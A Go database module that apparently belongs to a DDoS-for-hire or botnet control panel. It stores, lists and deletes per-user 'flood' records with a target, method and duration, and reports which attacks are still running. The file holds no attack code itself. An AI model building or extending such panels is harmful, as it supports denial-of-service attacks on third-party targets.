package database

import (
	"fmt"
	"time"
)

type Flood struct {
	Id       int
	UserId   int
	Target   string
	Duration int
	Method   string
	Created  time.Time
	End      time.Time
}

func LogAttack(flood *Flood, user *UserProfile) error {
	_, err := Instance.Exec("INSERT INTO logs (user_id, target, duration, method, time_created, time_end) VALUES (?, ?, ?, ?, ?, ?)", user.Id, flood.Target, flood.Duration, flood.Method, flood.Created.Unix(), flood.End.Unix())
	return err
}

func (flood *Flood) Remove() error {
	_, err := Instance.Exec("DELETE FROM logs WHERE id = ? AND user_id = ? ", flood.Id, flood.UserId)
	return err
}

func FloodsDuring(duration time.Duration) ([]*Flood, error) {
	var floods []*Flood

	endTime := time.Now()
	startTime := endTime.Add(-duration)

	rows, err := Instance.Query("SELECT * FROM logs WHERE time_created BETWEEN ? AND ?", startTime.Unix(), endTime.Unix())
	if err != nil {
		return nil, err
	}

	defer rows.Close()

	for rows.Next() {
		var flood = &Flood{}

		var created int64
		var end int64
		err := rows.Scan(&flood.Id, &flood.UserId, &flood.Target, &flood.Duration, &flood.Method, &created, &end)
		if err != nil {
			return nil, err
		}

		flood.Created = time.Unix(created, 0)
		flood.End = time.Unix(end, 0)

		floods = append(floods, flood)
	}

	return floods, nil
}

func Floods() ([]*Flood, error) {
	var floods []*Flood

	rows, err := Instance.Query("SELECT * FROM logs")
	if err != nil {
		return nil, err
	}

	defer rows.Close()

	for rows.Next() {
		var flood = &Flood{}

		var created int64
		var end int64
		err := rows.Scan(&flood.Id, &flood.UserId, &flood.Target, &flood.Duration, &flood.Method, &created, &end)
		if err != nil {
			return nil, err
		}

		flood.Created = time.Unix(created, 0)
		flood.End = time.Unix(end, 0)

		floods = append(floods, flood)
	}

	return floods, nil
}

func LastFlood() (*Flood, error) {
	rows, err := Instance.Query("SELECT * FROM logs WHERE rowid = (SELECT MAX(rowid) FROM logs)")
	if err != nil {
		return nil, err
	}

	defer rows.Close()

	if rows.Next() {
		var flood = &Flood{}

		var created int64
		var end int64
		err := rows.Scan(&flood.Id, &flood.UserId, &flood.Target, &flood.Duration, &flood.Method, &created, &end)
		if err != nil {
			return nil, err
		}

		flood.Created = time.Unix(created, 0)
		flood.End = time.Unix(end, 0)

		return flood, nil
	}

	return nil, nil
}

func RunningAttacks() ([]*Flood, error) {
	var ourFloods []*Flood

	floods, err := Floods()
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	for _, flood := range floods {
		if flood.End.After(time.Now()) {
			ourFloods = append(ourFloods, flood)
		}
	}

	return ourFloods, nil
}
